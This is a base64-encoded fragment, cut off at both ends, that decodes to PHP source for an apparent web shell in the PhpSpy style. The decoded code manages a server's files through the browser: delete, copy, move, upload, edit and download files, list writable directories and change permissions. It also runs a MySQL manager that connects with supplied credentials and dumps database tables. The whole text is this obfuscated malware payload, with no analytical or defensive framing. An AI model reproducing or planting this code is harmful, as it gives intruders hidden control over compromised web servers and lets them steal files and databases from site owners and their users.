lmIChAZGVsdHJlZSgkY3dkLiRmKSkgewoJCQkJCQkJCSRzdWNjKys7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRmYWlsKys7CgkJCQkJCQl9CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQlpZiAoQHVubGluaygkY3dkLiRmKSkgewoJCQkJCQkJCSRzdWNjKys7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRmYWlsKys7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQkJbSgnRGVsZXRlZCBmb2xkZXIvZmlsZShzKSBoYXZlIGZpbmlzaGVkLCBjaG9vc2UgJy5jb3VudCgkUFsnZGwnXSkuJywgc3VjY2VzcyAnLiRzdWNjLicsIGZhaWwgJy4kZmFpbCk7CgkJCQl9IGVsc2UgewoJCQkJCW0oJ1BsZWFzZSBzZWxlY3QgZm9sZGVyL2ZpbGUocyknKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQljYXNlICdwYXN0ZSc6CgkJCQlpZigkX1NFU1NJT05bJ2RvJ10gPT0gJ2NvcHknKSB7CgkJCQkJZm9yZWFjaCgkX1NFU1NJT05bJ2RsJ10gYXMgJGYpIHsKCQkJCQkJY29weV9wYXN0ZSgkX1NFU1NJT05bJ2MnXSwkZiwgJGN3ZCk7CQkJCQkKCQkJCQl9CgkJCQl9IGVsc2VpZigkX1NFU1NJT05bJ2RvJ10gPT0gJ21vdmUnKSB7CgkJCQkJZm9yZWFjaCgkX1NFU1NJT05bJ2RsJ10gYXMgJGYpIHsKCQkJCQkJQHJlbmFtZSgkX1NFU1NJT05bJ2MnXS4kZiwgJGN3ZC4kZik7CgkJCQkJfQoJCQkJfQoJCQkJdW5zZXQoJF9TRVNTSU9OWydkbyddLCAkX1NFU1NJT05bJ2RsJ10sICRfU0VTU0lPTlsnYyddKTsKCQkJCWJyZWFrOwoJCQlkZWZhdWx0OgoJCQkJaWYoJHAxID09ICdjb3B5JyB8fCAkcDEgPT0gJ21vdmUnKSB7CgkJCQkJaWYgKGlzc2V0KCRQWydkbCddKSAmJiBjb3VudCgkUFsnZGwnXSkpIHsKCQkJCQkJJF9TRVNTSU9OWydkbyddID0gJHAxOwoJCQkJCQkkX1NFU1NJT05bJ2RsJ10gPSAkUFsnZGwnXTsKCQkJCQkJJF9TRVNTSU9OWydjJ10gPSAkUFsnY3dkJ107CgkJCQkJCW0oJ0hhdmUgYmVlbiBjb3BpZWQgdG8gdGhlIHNlc3Npb24nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQltKCdQbGVhc2Ugc2VsZWN0IGZvbGRlci9maWxlKHMpJyk7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJfQoJCWVjaG8gIjxzY3JpcHQgdHlwZT1cInRleHQvamF2YXNjcmlwdFwiPiQoJ29wZm9ybScpLnAxLnZhbHVlPScnOyQoJ29wZm9ybScpLnAyLnZhbHVlPScnOzwvc2NyaXB0PiI7Cgl9CgkkZnJlZSA9IEBkaXNrX2ZyZWVfc3BhY2UoJGN3ZCk7CgkhJGZyZWUgJiYgJGZyZWUgPSAwOwoJJGFsbCA9IEBkaXNrX3RvdGFsX3NwYWNlKCRjd2QpOwoJISRhbGwgJiYgJGFsbCA9IDA7CgkkdXNlZCA9ICRhbGwtJGZyZWU7CglwKCc8aDI+RmlsZSBNYW5hZ2VyIC0gQ3VycmVudCBkaXNrIGZyZWUgJy5zaXplY291bnQoJGZyZWUpLicgb2YgJy5zaXplY291bnQoJGFsbCkuJyAoJy5Acm91bmQoMTAwLygkYWxsLyRmcmVlKSwyKS4nJSk8L2gyPicpOwoKCSRjd2RfbGlua3MgPSAnJzsKCSRwYXRoID0gZXhwbG9kZSgnLycsICRjd2QpOwoJJG49Y291bnQoJHBhdGgpOwoJZm9yKCRpPTA7JGk8JG4tMTskaSsrKSB7CgkJJGN3ZF9saW5rcyAuPSAnPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLCBcJyc7CgkJZm9yKCRqPTA7JGo8PSRpOyRqKyspIHsKCQkJJGN3ZF9saW5rcyAuPSAkcGF0aFskal0uJy8nOwoJCX0KCQkkY3dkX2xpbmtzIC49ICdcJyk7Ij4nLiRwYXRoWyRpXS4nLzwvYT4nOwoJfQoKPz4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpkb2N1bWVudC5vbmNsaWNrID0gc2hvd25hdjsKZnVuY3Rpb24gc2hvd25hdihlKXsKCXZhciBzcmMgPSBlP2UudGFyZ2V0OmV2ZW50LnNyY0VsZW1lbnQ7Cglkb3sKCQlpZihzcmMuaWQgPT0ianVtcHRvIikgewoJCQkkKCdpbnB1dG5hdicpLnN0eWxlLmRpc3BsYXkgPSAiIjsKCQkJJCgncGF0aG5hdicpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CgkJCXJldHVybjsKCQl9CgkJaWYoc3JjLmlkID09ImlucHV0bmF2IikgewoJCQlyZXR1cm47CgkJfQoJCXNyYyA9IHNyYy5wYXJlbnROb2RlOwoJfXdoaWxlKHNyYy5wYXJlbnROb2RlKQoKCSQoJ2lucHV0bmF2Jykuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKCSQoJ3BhdGhuYXYnKS5zdHlsZS5kaXNwbGF5ID0gIiI7Cn0KPC9zY3JpcHQ+CjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6I2VlZTttYXJnaW4tYm90dG9tOjEwcHg7Ij4KCTxmb3JtIG9uc3VibWl0PSJnKCdmaWxlJyx0aGlzLmN3ZC52YWx1ZSk7cmV0dXJuIGZhbHNlOyIgbWV0aG9kPSJQT1NUIiBpZD0iZ29kaXIiIG5hbWU9ImdvZGlyIj4KCQk8dGFibGUgaWQ9InBhdGhuYXYiIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSI1IiBjZWxsc3BhY2luZz0iMCI+CgkJCTx0cj4KCQkJCTx0ZCB3aWR0aD0iMTAwJSI+PD9waHAgZWNobyAkY3dkX2xpbmtzLicgLSAnLmdldENobW9kKCRjd2QpLicgLyAnLlBlcm1zQ29sb3IoJGN3ZCkuZ2V0VXNlcigkY3dkKTs/PiAoPD9waHAgZWNobyAkZGlyX3dyaXRlYWJsZTs/Pik8L3RkPgoJCQkJPHRkIG5vd3JhcD48aW5wdXQgY2xhc3M9ImJ0IiBpZD0ianVtcHRvIiBuYW1lPSJqdW1wdG8iIHZhbHVlPSJKdW1wIHRvIiB0eXBlPSJidXR0b24iPjwvdGQ+CgkJCTwvdHI+CgkJPC90YWJsZT4KCQk8dGFibGUgaWQ9ImlucHV0bmF2IiB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iNSIgY2VsbHNwYWNpbmc9IjAiIHN0eWxlPSJkaXNwbGF5Om5vbmU7Ij4KCQkJPHRyPgoJCQkJPHRkIG5vd3JhcD5DdXJyZW50IERpcmVjdG9yeSAoPD9waHAgZWNobyAkZGlyX3dyaXRlYWJsZTs/PiwgPD9waHAgZWNobyBnZXRDaG1vZCgkY3dkKTs/Pik8L3RkPgoJCQkJPHRkIHdpZHRoPSIxMDAlIj48aW5wdXQgY2xhc3M9ImlucHV0IiBuYW1lPSJjd2QiIHZhbHVlPSI8P3BocCBlY2hvICRjd2Q7Pz4iIHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDo5OSU7bWFyZ2luOjAgOHB4OyI+PC90ZD4KCQkJCTx0ZCBub3dyYXA+PGlucHV0IGNsYXNzPSJidCIgdmFsdWU9IkdPIiB0eXBlPSJzdWJtaXQiPjwvdGQ+CgkJCTwvdHI+CgkJPC90YWJsZT4KCTwvZm9ybT4KPD9waHAKCWlmIChJU19XSU4pIHsKCQkkY29tbWEgPSAnJzsKCQlwKCc8ZGl2IGNsYXNzPSJkcml2ZXMiPicpOwoJCWZvcmVhY2goIHJhbmdlKCdBJywnWicpIGFzICRkcml2ZSApIHsKCQkJaWYgKGlzX2RpcigkZHJpdmUuJzovJykpIHsKCQkJCXAoJGNvbW1hLic8YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsIFwnJy4kZHJpdmUuJzovXCcpOyI+Jy4kZHJpdmUuJzpcPC9hPicpOwoJCQkJJGNvbW1hID0gJzxzcGFuPnw8L3NwYW4+JzsKCQkJfQoJCX0KCQlwKCc8L2Rpdj4nKTsKCX0KPz4KPC9kaXY+Cjw/cGhwCglwKCc8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjQiIGNlbGxzcGFjaW5nPSIwIj4nKTsKCXAoJzx0ciBjbGFzcz0iYWx0MSI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJwYWRkaW5nOjVweDtsaW5lLWhlaWdodDoyMHB4OyI+Jyk7CglwKCc8Zm9ybSBhY3Rpb249IicuU0VMRi4nIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0OyI+PGlucHV0IG5hbWU9InVwbG9hZGZpbGUiIHZhbHVlPSIiIHR5cGU9ImZpbGUiIC8+IDxpbnB1dCBjbGFzcz0iYnQiIHZhbHVlPSJVcGxvYWQiIHR5cGU9InN1Ym1pdCIgLz48aW5wdXQgbmFtZT0iY2hhcnNldCIgdmFsdWU9IicuJGNoYXJzZXQuJyIgdHlwZT0iaGlkZGVuIiAvPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InAxIiB2YWx1ZT0idXBsb2FkRmlsZSI+PGlucHV0IG5hbWU9ImN3ZCIgdmFsdWU9IicuJGN3ZC4nIiB0eXBlPSJoaWRkZW4iIC8+PC9kaXY+PC9mb3JtPicpOwoJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLCBcJycuc3RyX3JlcGxhY2UoJ1xcJywnLycsJHdlYl9jd2QpLidcJyk7Ij5XZWJSb290PC9hPicpOwoJcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLCBcJycuJGhvbWVfY3dkLidcJyk7Ij5TY3JpcHRQYXRoPC9hPicpOwoJcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLFwnJy4kY3dkLidcJyxudWxsLG51bGwsbnVsbCxcJ2RpclwnKTsiPlZpZXcgV3JpdGFibGUgRGlyZWN0b3J5PC9hPiAnKTsKCXAoJyB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6Y3JlYXRlZGlyKCk7Ij5DcmVhdGUgRGlyZWN0b3J5PC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6Y3JlYXRlZmlsZSgpOyI+Q3JlYXRlIEZpbGU8L2E+Jyk7CglwKCc8L3RkPjwvdHI+Jyk7CgoJJHNvcnQgPSBhcnJheSgnZmlsZW5hbWUnLCAxKTsKCWlmKCRwMSkgewoJCWlmKHByZWdfbWF0Y2goJyFzXyhbQS16X10rKV8oXGR7MX0pIScsICRwMSwgJG1hdGNoKSkgewoJCQkkc29ydCA9IGFycmF5KCRtYXRjaFsxXSwgKGludCkkbWF0Y2hbMl0pOwoJCX0KCX0KCglmb3JtaGVhZChhcnJheSgnbmFtZSc9PidmbGlzdCcpKTsKCW1ha2VoaWRlKCdhY3QnLCdmaWxlJyk7CgltYWtlaGlkZSgncDEnLCcnKTsKCW1ha2VoaWRlKCdjd2QnLCRjd2QpOwoJbWFrZWhpZGUoJ2NoYXJzZXQnLCRjaGFyc2V0KTsKCXAoJzx0ciBjbGFzcz0iaGVhZCI+Jyk7CglwKCc8dGQgd2lkdGg9IjIlIiBub3dyYXA+PGlucHV0IG5hbWU9ImNoa2FsbCIgdmFsdWU9Im9uIiB0eXBlPSJjaGVja2JveCIgb25jbGljaz0iY2hlY2thbGwodGhpcy5mb3JtKSIgLz48L3RkPicpOwoJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJyxudWxsLFwnc19maWxlbmFtZV8nLigkc29ydFsxXT8wOjEpLidcJyk7Ij5GaWxlbmFtZTwvYT4gJy4oJHAxID09ICdzX2ZpbGVuYW1lXzAnID8gJGRjaGFyIDogJycpLigkcDEgPT0gJ3NfZmlsZW5hbWVfMScgfHwgISRwMSA/ICR1Y2hhciA6ICcnKS4nPC90ZD4nKTsKCXAoJzx0ZCB3aWR0aD0iMTYlIj48YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsbnVsbCxcJ3NfbXRpbWVfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+TGFzdCBtb2RpZmllZDwvYT4gJy4oJHAxID09ICdzX210aW1lXzAnID8gJGRjaGFyIDogJycpLigkcDEgPT0gJ3NfbXRpbWVfMScgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CglwKCc8dGQgd2lkdGg9IjEwJSI+PGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLG51bGwsXCdzX3NpemVfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+U2l6ZTwvYT4gJy4oJHAxID09ICdzX3NpemVfMCcgPyAkZGNoYXIgOiAnJykuKCRwMSA9PSAnc19zaXplXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJcCgnPHRkIHdpZHRoPSIyMCUiPkNobW9kIC8gUGVybXM8L3RkPicpOwoJcCgnPHRkIHdpZHRoPSIyMiUiPkFjdGlvbjwvdGQ+Jyk7CglwKCc8L3RyPicpOwoJJGRpcmRhdGE9JGZpbGVkYXRhPWFycmF5KCk7CglpZiAoJHA0ID09ICdkaXInKSB7CgkJJGRpcmRhdGEgPSBHZXRXRGlyTGlzdCgkY3dkKTsKCQkkZmlsZWRhdGEgPSBhcnJheSgpOwoJfSBlbHNlIHsKCQkkZGlycyA9IEBzY2FuZGlyKCRjd2QpOwoJCWlmICgkZGlycykgewoJCQkkZGlycyA9IGFycmF5X2RpZmYoJGRpcnMsIGFycmF5KCcuJykpOwoJCQlmb3JlYWNoICgkZGlycyBhcyAkZmlsZSkgewoJCQkJJGZpbGVwYXRoPSRjd2QuJGZpbGU7CgkJCQlpZihAaXNfZGlyKCRmaWxlcGF0aCkpewoJCQkJCSRkaXJkYlsnZmlsZW5hbWUnXT0kZmlsZTsKCQkJCQkkZGlyZGJbJ210aW1lJ109QGRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlbXRpbWUoJGZpbGVwYXRoKSk7CgkJCQkJJGRpcmRiWydjaG1vZCddPWdldENobW9kKCRmaWxlcGF0aCk7CgkJCQkJJGRpcmRiWydwZXJtJ109UGVybXNDb2xvcigkZmlsZXBhdGgpOwoJCQkJCSRkaXJkYlsnb3duZXInXT1nZXRVc2VyKCRmaWxlcGF0aCk7CgkJCQkJJGRpcmRiWydsaW5rJ109JGZpbGVwYXRoOwoJCQkJCWlmICgkZmlsZT09Jy4uJykgewoJCQkJCQkkZGlyZGF0YVsndXAnXT0xOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSRkaXJkYXRhW109JGRpcmRiOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJJGZpbGVkYlsnZmlsZW5hbWUnXT0kZmlsZTsKCQkJCQkvLyRmaWxlZGJbJ3NpemUnXT1AZmlsZXNpemUoJGZpbGVwYXRoKTsKCQkJCQkkZmlsZWRiWydzaXplJ109c3ByaW50ZigiJXUiLCBAZmlsZXNpemUoJGZpbGVwYXRoKSk7CgkJCQkJJGZpbGVkYlsnbXRpbWUnXT1AZGF0ZSgnWS1tLWQgSDppOnMnLGZpbGVtdGltZSgkZmlsZXBhdGgpKTsKCQkJCQkkZmlsZWRiWydjaG1vZCddPWdldENobW9kKCRmaWxlcGF0aCk7CgkJCQkJJGZpbGVkYlsncGVybSddPVBlcm1zQ29sb3IoJGZpbGVwYXRoKTsKCQkJCQkkZmlsZWRiWydvd25lciddPWdldFVzZXIoJGZpbGVwYXRoKTsKCQkJCQkkZmlsZWRiWydsaW5rJ109JGZpbGVwYXRoOwoJCQkJCSRmaWxlZGF0YVtdPSRmaWxlZGI7CgkJCQl9CgkJCX0KCQkJdW5zZXQoJGRpcmRiKTsKCQkJdW5zZXQoJGZpbGVkYik7CgkJfQoJfQoJJGRpcl9pID0gJzAnOwoJaWYgKGlzc2V0KCRkaXJkYXRhWyd1cCddKSkgewoJCSR0aGlzYmcgPSBiZygpOwoJCXAoJzx0ciBjbGFzcz0iJy4kdGhpc2JnLiciIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJycuJHRoaXNiZy4nXCc7Ij4nKTsKCQlwKCc8dGQgYWxpZ249ImNlbnRlciI+LTwvdGQ+PHRkIG5vd3JhcCBjb2xzcGFuPSI1Ij48YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsXCcnLmdldFVwUGF0aCgkY3dkKS4nXCcpOyI+UGFyZW50IERpcmVjdG9yeTwvYT48L3RkPicpOwoJCXAoJzwvdHI+Jyk7Cgl9Cgl1bnNldCgkZGlyZGF0YVsndXAnXSk7Cgl1c29ydCgkZGlyZGF0YSwgJ2NtcCcpOwoJdXNvcnQoJGZpbGVkYXRhLCAnY21wJyk7Cglmb3JlYWNoKCRkaXJkYXRhIGFzICRrZXkgPT4gJGRpcmRiKXsKCQlpZigkcDEgPT0gJ2dldHNpemUnICYmICRwMiA9PSAkZGlyZGJbJ2ZpbGVuYW1lJ10pIHsKCQkJJGF0dGFjaHNpemUgPSBkaXJzaXplKCRwMik7CgkJCSRhdHRhY2hzaXplID0gaXNfbnVtZXJpYygkYXR0YWNoc2l6ZSkgPyBzaXplY291bnQoJGF0dGFjaHNpemUpIDogJ1Vua25vd24nOwoJCX0gZWxzZSB7CgkJCSRhdHRhY2hzaXplID0gJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJywgbnVsbCwgXCdnZXRzaXplXCcsIFwnJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPlN0YXQ8L2E+JzsKCQl9CgkJJHRoaXNiZyA9IGJnKCk7CgkJcCgnPHRyIGNsYXNzPSInLiR0aGlzYmcuJyIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnJy4kdGhpc2JnLidcJzsiPicpOwoJCXAoJzx0ZCB3aWR0aD0iMiUiIG5vd3JhcD48aW5wdXQgbmFtZT0iZGxbXSIgdHlwZT0iY2hlY2tib3giIHZhbHVlPSInLiRkaXJkYlsnZmlsZW5hbWUnXS4nIj48L3RkPicpOwoJCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsXCcnLiRkaXJkYlsnbGluayddLidcJykiPicuJGRpcmRiWydmaWxlbmFtZSddLic8L2E+PC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ25ld3RpbWVcJyxudWxsLFwnJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPicuJGRpcmRiWydtdGltZSddLic8L2E+PC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPicuJGF0dGFjaHNpemUuJzwvdGQ+Jyk7CgkJcCgnPHRkIG5vd3JhcD4nKTsKCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmZpbGVwZXJtKFwnJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJ1wnLCBcJycuJGRpcmRiWydjaG1vZCddLidcJyk7Ij4nLiRkaXJkYlsnY2htb2QnXS4nPC9hPiAvICcpOwoJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZmlsZXBlcm0oXCcnLiRkaXJkYlsnZmlsZW5hbWUnXS4nXCcsIFwnJy4kZGlyZGJbJ2NobW9kJ10uJ1wnKTsiPicuJGRpcmRiWydwZXJtJ10uJzwvYT4nLiRkaXJkYlsnb3duZXInXS4nPC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPjxhIGhyZWY9ImphdmFzY3JpcHQ6cmVuYW1lKFwnJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPlJlbmFtZTwvYT48L3RkPicpOwoJCXAoJzwvdHI+Jyk7CgkJJGRpcl9pKys7Cgl9CgoJcCgnPHRyIGJnY29sb3I9IiNkZGRkZGQiIHN0bHllPSJib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7Ij48dGQgY29sc3Bhbj0iNiIgaGVpZ2h0PSI1Ij48L3RkPjwvdHI+Jyk7CgkkZmlsZV9pID0gJzAnOwoKCWZvcmVhY2goJGZpbGVkYXRhIGFzICRrZXkgPT4gJGZpbGVkYil7CgkJJGZpbGV1cmwgPSAnLycuc3RyX3JlcGxhY2UoJHdlYl9jd2QsJycsJGZpbGVkYlsnbGluayddKTsKCQkkdGhpc2JnID0gYmcoKTsKCQlwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7CgkJcCgnPHRkIHdpZHRoPSIyJSIgbm93cmFwPjxpbnB1dCBuYW1lPSJkbFtdIiB0eXBlPSJjaGVja2JveCIgdmFsdWU9IicuJGZpbGVkYlsnZmlsZW5hbWUnXS4nIj48L3RkPicpOwoJCXAoJzx0ZD4nLigoc3RycG9zKCRmaWxlZGJbJ2xpbmsnXSwgJHdlYl9jd2QpICE9PSBmYWxzZSkgPyAnPGEgaHJlZj0iJy4kZmlsZXVybC4nIiB0YXJnZXQ9Il9ibGFuayI+Jy4kZmlsZWRiWydmaWxlbmFtZSddLic8L2E+JyA6ICRmaWxlZGJbJ2ZpbGVuYW1lJ10pLic8L3RkPicpOwoJCXAoJzx0ZCBub3dyYXA+PGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnbmV3dGltZVwnLG51bGwsXCcnLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPicuJGZpbGVkYlsnbXRpbWUnXS4nPC9hPjwvdGQ+Jyk7CgkJcCgnPHRkIG5vd3JhcD4nLnNpemVjb3VudCgkZmlsZWRiWydzaXplJ10pLic8L3RkPicpOwoJCXAoJzx0ZCBub3dyYXA+Jyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGZpbGVkYlsnZmlsZW5hbWUnXS4nXCcsIFwnJy4kZmlsZWRiWydjaG1vZCddLidcJyk7Ij4nLiRmaWxlZGJbJ2NobW9kJ10uJzwvYT4gLyAnKTsKCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmZpbGVwZXJtKFwnJy4kZmlsZWRiWydmaWxlbmFtZSddLidcJywgXCcnLiRmaWxlZGJbJ2NobW9kJ10uJ1wnKTsiPicuJGZpbGVkYlsncGVybSddLic8L2E+Jy4kZmlsZWRiWydvd25lciddLic8L3RkPicpOwoJCXAoJzx0ZCBub3dyYXA+Jyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZG93blwnLG51bGwsXCcnLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPkRvd248L2E+IHwgJyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZWRpdGZpbGVcJyxudWxsLG51bGwsXCcnLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPkVkaXQ8L2E+IHwgJyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpyZW5hbWUoXCcnLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJ1wnKTsiPlJlbmFtZTwvYT4nKTsKCQlwKCc8L3RkPjwvdHI+Jyk7CgkJJGZpbGVfaSsrOwoJfQoJcCgnPHRyIGNsYXNzPSInLmJnKCkuJyBoZWFkIj48dGQgY29sc3Bhbj0iNSI+PGEgaHJlZj0iIyIgb25jbGljaz0iJChcJ2ZsaXN0XCcpLnAxLnZhbHVlPVwnZGVsZXRlXCc7JChcJ2ZsaXN0XCcpLnN1Ym1pdCgpOyI+RGVsZXRlPC9hPiB8IDxhIGhyZWY9IiMiIG9uY2xpY2s9IiQoXCdmbGlzdFwnKS5wMS52YWx1ZT1cJ2NvcHlcJzskKFwnZmxpc3RcJykuc3VibWl0KCk7Ij5Db3B5PC9hPiB8IDxhIGhyZWY9IiMiIG9uY2xpY2s9IiQoXCdmbGlzdFwnKS5wMS52YWx1ZT1cJ21vdmVcJzskKFwnZmxpc3RcJykuc3VibWl0KCk7Ij5Nb3ZlPC9hPicuKGlzc2V0KCRfU0VTU0lPTlsnZG8nXSkgJiYgQGNvdW50KCRfU0VTU0lPTlsnZGwnXSkgPyAnIHwgPGEgaHJlZj0iIyIgb25jbGljaz0iJChcJ2ZsaXN0XCcpLnAxLnZhbHVlPVwncGFzdGVcJzskKFwnZmxpc3RcJykuc3VibWl0KCk7Ij5QYXN0ZTwvYT4nIDogJycpLic8L3RkPjx0ZCBhbGlnbj0icmlnaHQiPicuJGRpcl9pLicgZGlyZWN0b3JpZXMgLyAnLiRmaWxlX2kuJyBmaWxlczwvdGQ+PC90cj4nKTsKCXAoJzwvZm9ybT48L3RhYmxlPicpOwp9Ly8gZW5kIGRpcgoKZWxzZWlmICgkYWN0ID09ICdteXNxbGFkbWluJykgewoJJG9yZGVyID0gaXNzZXQoJFBbJ29yZGVyJ10pID8gJFBbJ29yZGVyJ10gOiAnJzsKCSRkYmhvc3QgPSBpc3NldCgkUFsnZGJob3N0J10pID8gJFBbJ2RiaG9zdCddIDogJyc7CgkkZGJ1c2VyID0gaXNzZXQoJFBbJ2RidXNlciddKSA/ICRQWydkYnVzZXInXSA6ICcnOwoJJGRicGFzcyA9IGlzc2V0KCRQWydkYnBhc3MnXSkgPyAkUFsnZGJwYXNzJ10gOiAnJzsKCSRkYm5hbWUgPSBpc3NldCgkUFsnZGJuYW1lJ10pID8gJFBbJ2RibmFtZSddIDogJyc7CgkkdGFibGVuYW1lID0gaXNzZXQoJFBbJ3RhYmxlbmFtZSddKSA/ICRQWyd0YWJsZW5hbWUnXSA6ICcnOwoKCWlmICgkZG9pbmcgPT0gJ2R1bXAnKSB7CgkJaWYgKGlzc2V0KCRQWydiYWtfdGFibGUnXSkgJiYgJFBbJ2Jha190YWJsZSddKSB7CgkJCSREQiA9IG5ldyBEQl9NeVNRTDsKCQkJJERCLT5jaGFyc2V0ZGIgPSAkY2hhcnNldGRiOwoJCQkkREItPmNoYXJzZXQgPSAkY2hhcnNldDsKCQkJJERCLT5jb25uZWN0KCRkYmhvc3QsICRkYnVzZXIsICRkYnBhc3MsICRkYm5hbWUpOwoJCQlpZiAoJFBbJ3NhdmVhc2ZpbGUnXSAmJiAkUFsnYmFrX3BhdGgnXSkgewoJCQkJJGZwID0gQGZvcGVuKCRQWydiYWtfcGF0aCddLCd3Jyk7CgkJCQlpZiAoJGZwKSB7CgkJCQkJZm9yZWFjaCgkUFsnYmFrX3RhYmxlJ10gYXMgJGsgPT4gJHYpIHsKCQkJCQkJaWYgKCR2KSB7CgkJCQkJCQkkREItPnNxbGR1bXAoJHYsICRmcCk7CgkJCQkJCX0KCQkJCQl9CgkJCQkJZmNsb3NlKCRmcCk7CQkJCQoJCQkJCSRmaWxldXJsID0gc3RyX3JlcGxhY2UoU0FfUk9PVCwnJywkUFsnYmFrX3BhdGgnXSk7CgkJCQkJbSgnRGF0YWJhc2UgaGFzIGJhY2t1cCB0byA8YSBocmVmPSInLiRmaWxldXJsLiciIHRhcmdldD0iX2JsYW5rIj4nLiRQWydiYWtfcGF0aCddLic8L2E+Jyk7CgkJCQl9IGVsc2UgewoJCQkJCW0oJ0JhY2t1cCBmYWlsZWQnKTsKCQkJCX0KCQkJfSBlbHNlIHsKCQkJCUBvYl9lbmRfY2xlYW4oKTsKCQkJCSRmaWxlbmFtZSA9IGJhc2VuYW1lKCRkYm5hbWUuJy5zcWwnKTsKCQkJCWhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi91bmtub3duJyk7CgkJCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPScuJGZpbGVuYW1lKTsKCQkJCWZvcmVhY2goJFBbJ2Jha190YWJsZSddIGFzICRrID0+ICR2KSB7CgkJCQkJaWYgKCR2KSB7CgkJCQkJCSREQi0+c3FsZHVtcCgkdik7CgkJCQkJfQoJCQkJfQoJCQkJZXhpdDsKCQkJfQoJCQkkREItPmNsb3NlKCk7CgkJfSBlbHNlIHsKCQkJbSgnUGxlYXNlIGNob29zZSB0aGUgdGFibGUnKTsKCQl9CgkJJGRvaW5nID0gJyc7Cgl9CgoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J01ZU1FMIE1hbmFnZXInLCAnbmFtZSc9PidkYmZvcm0nKSk7CgltYWtlaGlkZSgnYWN0JywnbXlzcWxhZG1pbicpOwoJbWFrZWhpZGUoJ2RvaW5nJywkZG9pbmcpOwoJbWFrZWhpZGUoJ2NoYXJzZXQnLCAkY2hhcnNldCk7CgltYWtlaGlkZSgndGFibGVuYW1lJywgJHRhYmxlbmFtZSk7